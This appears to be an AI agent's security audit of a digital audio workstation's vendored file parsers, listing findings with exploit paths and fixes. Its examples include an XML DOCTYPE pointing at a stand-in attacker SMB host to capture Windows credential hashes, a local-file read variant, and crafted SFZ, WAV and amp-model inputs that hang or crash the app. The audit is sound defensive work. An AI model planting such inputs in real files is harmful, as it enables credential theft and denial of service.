# BaySickDAW Security Audit - CL-289 Tier 1, Part 2 (vendored parsers) + Part 4 (save-file format)

**Date:** 2026-08-10
**Batch:** QA-Cleanup (`spry-tidying-pika`)
**Agent:** `security-auditor` via `/audit-security`
**Companion reports:**
- `security-audit-2026-08-10.md` - Part 2, OUR parsers under `Source/`
- `security-audit-2026-08-10-part3-cve-and-dll.md` - Part 1 (CVE scan) + Part 3 (DLL safety)

> **Tiering note.** This run was originally commissioned and labelled "Tier 2 =
> vendored". That label was WRONG. Future State CL-289 tiers by RELEASE PHASE:
> Tier 1 is the V1 pre-release sweep and has four parts (CVE scan, file-parser
> audit, DLL safety, save-file format audit). Vendored parsers and XXE are both
> Tier-1 items. This run is Tier-1 work. Real Tier 2 is the QA-Updater network
> audit and is not runnable yet. Corrected 2026-08-10 after Jeff quoted the
> original spec back.

**Scope:** `libs/sfizz`, `libs/NeuralAmpModelerCore`, and the untrusted-input
paths in `juce/`. The other six vendored libraries were checked for file-parsing
entry points and have none - they take in-memory audio buffers.

---

## Parent-session verification

Per `feedback_verify_subagent_finding_premise`. Re-read in the parent session:

| # | Premise | Verified |
|---|---|---|
| V-1 | JUCE XML reads external DOCTYPE files | **CONFIRMED.** `juce_XmlDocument.cpp:812-820` tests for `system` + a quoted string and calls `getFileContents`, which at `:184-190` goes through `inputSource->createInputStreamFor`. `juce_FileInputSource.cpp:52-55` resolves that with `getSiblingFile`, which passes an absolute path (including `\\server\share`) straight through. `ProjectManager.cpp:314` parses `project.xml` from a **File**, which is what attaches the input source. |
| V-3 | The Tier-1 WAV fix did not cover the channel count | **CONFIRMED, and it is a gap in my own fix.** `BaySickPlayerDSP.cpp:584` clamps the DESTINATION channels and `:594` bounds the length, but `:600` still calls `reader->read(...)`, and JUCE's loop uses the reader's own channel count and `bytesPerFrame`. |
| V-4 | sfizz `#define` expansion has no iteration cap | **CONFIRMED.** `Parser.cpp:514-556`: `while (keepExpanding)` with `keepExpanding = numExpansions > 0`, no cap, no self-reference check. `#define $A $A` re-expands to identical text forever. |
| V-5 | sfizz's recursive-include guard is off | **CONFIRMED.** `Parser.h:105` - `_recursiveIncludeGuardEnabled = false`, and `setRecursiveIncludeGuardEnabled` (`Parser.h:40`) is never called anywhere in the library or by us. Only the depth cap of 32 applies, and a depth cap is not a work cap. |
| V-2, V-6..V-11 | | Not individually re-verified; recorded as agent findings. |

---

## Findings

### V-1 - HIGH - A shared project file can hand the user's Windows credentials to a stranger's server

`juce_XmlDocument.cpp:804-820` and `:895-913`, reached because `:39` attaches a
file-reading helper whenever XML is parsed from a `File` - which is how every
project loads (`ProjectManager.cpp:314`).

JUCE's XML parser honours `<!DOCTYPE name SYSTEM "path">` and fetches that path
when it expands an entity. The path comes out of the document. On Windows a path
beginning `\\` is a network share.

**Exploit path.** A shared project folder whose `project.xml` opens with
`<!DOCTYPE BaySickDAWProject SYSTEM "\\collect.attacker.com\x\a.dtd">` and has a
single `&x;` in the body. On open, before any of our code sees an element,
Windows opens an SMB connection and offers the user's account name and NTLM hash
to authenticate - standard Windows behaviour, not an app bug. The hash is
crackable offline or relayable. Nothing is displayed. A local path variant
(`SYSTEM "C:/Users/.../passwords.txt"`) pulls that file's text INTO the loaded
project, and it travels if the project is re-shared.

Affects all 27 sites where we parse XML from a file - projects, page presets,
rack presets, key bindings, the plugin list, settings.

**Host-side fix: YES, complete.** Parse from a STRING rather than a File. The
`XmlDocument(const String&)` constructor leaves `inputSource` null, so
`getFileContents` returns nothing and the external fetch cannot happen. Add a
DOCTYPE rejection and a nesting-depth cap in the same pre-parse pass (the cap
also closes V-8). We never write a DOCTYPE in anything we produce.

### V-2 - HIGH - A `.nam` capture can read gigabytes of unrelated memory, and our `catch (...)` cannot stop it

`NAM/lstm.cpp:9-28` and `:99`; `NAM/wavenet/model.cpp:623-645`;
`NAM/conv1d.cpp:9-52`. Our call sites: `BaySickNAMIRProcessor.cpp:640-681`,
`NAMPedalStyleDSP.cpp:124-146`.

A `.nam` is JSON: a `config` block describing the network's shape and a flat
`weights` array. The loader walks the shape and pulls one number per connection
through a raw pointer that is never checked against the end of the list. LSTM's
only check is `assert(it == weights.end())` - compiled out in Release. WaveNet's
check runs AFTER every read. ConvNet's `_verify_weights` is an empty `// TODO`.

**Exploit path.** A shared amp capture declares `hidden_size: 4096`,
`num_layers: 8`, and supplies ten weights. The loader needs ~550 million numbers,
reads ten real ones, then reads ~2.2 GB of adjacent memory. Usually an instant
crash; where it survives, unrelated process memory becomes the model's
coefficients and therefore the SOUND - render that track and the user has shipped
a slice of their own memory.

**Why `catch (...)` does not help:** it catches C++ exceptions. An over-read is
not one. On Windows an access violation is a Structured Exception, which MSVC's
default `/EHsc` does not route to `catch (...)`.

**Host-side fix: PARTIAL.** Pre-parse the JSON and reject implausible dimensions
before calling `nam::get_dsp`. That kills the large cases but not a small
mismatch. The clean host-side option: parse the JSON ourselves, append a generous
run of zeros to `weights`, and call the `get_dsp(const nlohmann::json&)` overload
so any over-read reads our own zeros.

### V-3 - MEDIUM - A crafted WAV or AIFF freezes the app forever at 100% CPU

`juce_WavAudioFormat.cpp:1493-1513` fed by `:1267` (channel count, unchecked) and
`:1284`. Identical in `juce_AiffAudioFormat.cpp:598-620`.

JUCE reads through a fixed 5,760-byte scratch buffer and computes
`numThisTime = jmin (tempBufSize / bytesPerFrame, numSamples)`. If the header
declares enough channels that one frame exceeds 5,760 bytes, that division is
**zero**: the loop reads nothing, subtracts nothing, and repeats forever.

**This is not covered by the earlier fix.** Clamping the destination channel
count and the length does not change the loop, which uses the READER's channel
count.

**Host-side fix: YES, one line per reader creation.** Reject
`reader->numChannels` above a sane ceiling at every place we open a user file.

### V-4 - MEDIUM - Two lines in an SFZ hang the app forever

`Parser.cpp:504-558`. SFZ `#define $NAME value` macros are expanded by repeated
sweeps until no `$` remains, with no iteration cap and no self-reference check.
`#define $A $A` never terminates; `#define $A $A$A` doubles the text each pass
and exhausts memory in ~30.

Reaches us through the kit path stored in the project (Guitars
`:534`, Basses `:524`, Rusty `:553`/`:558`), plus `InstPage.cpp:520-536` and
`PagePresetIO.cpp:187-200`. Load runs on the UI thread.

**Host-side fix: YES, complete.** Our own SFZ scanner already walks the file and
its includes and reads every `#define`. Run it BEFORE `loadSfzFile` as a gate and
refuse any `#define` whose value contains `$`.

### V-5 - MEDIUM - An SFZ that includes itself twice does two billion file opens

`Parser.h:104-105`, `Parser.cpp:73-92`. The recursive-include guard is OFF by
default and never enabled; only a depth cap of 32 applies. `kit.sfz` containing
two `#include "kit.sfz"` lines is 2^31 opens.

Same shape as the LOW-9 finding fixed in OUR scanner - sfizz does its own include
walking, so our fix does not protect it.

**Host-side fix: YES.** Same pre-flight gate as V-4; our scanner already tracks a
visited set and a budget.

### V-6 - MEDIUM - A malformed WAV kills the process outright from a background thread

`FilePool.cpp:100-107` (allocation), `:480` (`noexcept`), `Buffer.h:200-204`
(throws). Frame count from `dr_wav.h:3688`/`:3698`, computed as data-chunk size
divided by frame size with no comparison to the real file length.

A `noexcept` function that throws calls `std::terminate` - the process dies with
no unwinding, no dialog, no crash report.

**Exploit path.** A 200-byte WAV claiming an 8 GB data chunk. Preload is bounded
so the kit loads and looks fine; the moment the note is played, the background
loader asks for 8 GB, fails, and BaySickDAW vanishes mid-song.

**Host-side fix: PARTIAL** - pre-validate every WAV a kit references (declared
size vs real file size). Blanket alternative in V-10.

### V-7 - MEDIUM - One opcode with a big index allocates megabytes

`Region.cpp:24-36` used at `:576-582`, `:721`, `:1248-1253`. The index in an
opcode NAME (`lfo1_freq`) grows a vector, uncapped, up to the 16-bit ceiling of
65,535. A 250 KB SFZ of `lfo65535_freq=1` regions asks for ~200 GB.

**Host-side fix: PARTIAL** - reject opcode names with an index above ~64 in the
same pre-flight scan.

### V-8 - MEDIUM - Deeply nested project XML overflows the stack

`juce_XmlDocument.cpp:562`, `:619` - recursion per nesting level, no depth limit.
200,000 nested tags is ~600 KB of text and kills the thread on the way in, and
again on the way out when the tree is freed.

**Host-side fix: YES** - count max nesting in the pre-parse pass and refuse above
a generous cap. Shares the pass with V-1.

### V-9 - MEDIUM - A `.nam` with one absurd number freezes the app on load

`dsp.cpp:30-64`, fed by `lstm.cpp:125-131` and `wavenet/model.cpp:616-620`; the
value enters at `get_dsp.cpp:262-268`. Pre-warm length is taken from the model
file: half `sample_rate` for LSTM, the sum of `dilations` for WaveNet. Neither is
range-checked. `"sample_rate": 2000000000` means ~2 million full network
evaluations on the message thread. Nothing throws; the load simply never returns.

**Host-side fix: YES, complete** - pre-check the JSON before `nam::get_dsp`.

### V-10 - LOW - An SFZ can name any file on the machine as its sample

`Region.cpp:62-76` (`sample=`), `Synth.cpp:427-430` (`default_path=`), resolved at
`FilePool.cpp:171`/`:301`. `../` survives and an absolute path replaces the base.

**Ranked LOW for the same reason the first report ranked its `library:` finding
LOW:** the boundary does not exist elsewhere either. Practical effect today is
reading a file and failing to decode it - except the `\\server\share` variant,
which is the V-1 credential leak triggered by playing a note.

**Host-side fix: YES for the UNC half** (reject `sample=` / `default_path=`
beginning `\\` in the pre-flight). The general `../` case needs confining kit
loading to the Core Library root - a product decision.

### V-11 - LOW / policy - We enabled a decoder JUCE ships disabled, and nobody has audited it

`CMakeLists.txt:64` sets `JUCE_USE_MP3AUDIOFORMAT=1`, registering
`juce_MP3AudioFormat.cpp` - 3,185 lines of hand-ported MP3 bitstream decoding
whose validation is largely `jassert` (a no-op in Release). The bit reader at
`:1672-1701` advances with no end-of-buffer test and includes a function named
`getBitsUnchecked`.

**No specific exploitable path was found** - the huffman and requantize stages,
where such bugs historically live, were not read. Recorded as an unaudited
surface, not a proven bug.

**Options:** accept and record, turn the flag off (costs `.mp3` import), or audit
the decoder as its own piece of work. **Spec call.**

---

## Checked and clean

**sfizz does NOT have the three bugs fixed on our side, and its opcode layer is
well built.** `sw_down` / `sw_up` / `sw_last` go through
`opcode.readOptional(Default::key)`, and `Defaults.cpp:48` declares that bounded
0-127 with no permissive flag - so `Opcode.cpp:151-161` REJECTS out-of-range
values rather than clamping, and `sw_down=9999` is silently dropped.
`seq_length` is declared 1-100 (`Defaults.cpp:83`), so the modulo at
`Layer.cpp:65`/`:193` cannot divide by zero. Loop points cannot invert
(`Voice.cpp:1753`). Playback is bounded against frames actually in memory
(`:1165`), not against the header. `offset=` is clamped (`RegionStateful.cpp:25`).
Index-underflow is handled throughout `Region.cpp`. sfizz's own RIFF/AIFF
metadata reader uses correctly bounds-tested fixed buffers
(`FileMetadata.cpp:352-398`).

**JUCE's billion-laughs does not work - but by accident, not by design.**
`juce_XmlDocument.cpp:865-884` expands nested entities but uses the wrong
variable as its search position, so nested expansion produces garbage instead of
exponential growth. **This is a bug that happens to prevent an attack.** If JUCE
ever fixes the indexing, the attack becomes live. Recorded so the next reader
knows where to look.

**JUCE's WAV/AIFF sample conversion cannot overflow its scratch buffer** - bit
depth and frame size are derived from each other, and unusual bit depths fall
through to silence. V-3 is a livelock, not memory unsafety.

---

## Not covered

- libFLAC and libvorbis vendored inside JUCE - registered decoders, attacker-fed,
  not read at all.
- `juce_MP3AudioFormat.cpp` - spot-checked only.
- nlohmann `json.hpp` and vendored Eigen inside NAM - not read.
- NAM's `a2_fast.cpp`, `slimmable.cpp`, `film.h`, `gating_activations.h` -
  alternative WaveNet paths selected by the model file's own `architecture`
  string. If any loads weights it likely repeats V-2.
- sfizz's `effects/` and `modulations/` subtrees.
- **sfizz's OTHER bundled decoders** - `dr_flac`, `dr_mp3`, `stb_vorbis`,
  `libaiff`, `wavpack`. Sample packs reach TWO independent decoder stacks (JUCE's
  and sfizz's). Only the dr_wav frame-count path was traced. **Part 1's CVE scan
  subsequently found two HIGH findings in exactly this set.**
- abseil, simde, kiss_fft, pugixml, hiir, ghc::filesystem under sfizz.
- No dynamic testing. Every finding is a code-reading argument.
- Version currency was not checked - that became Part 1.
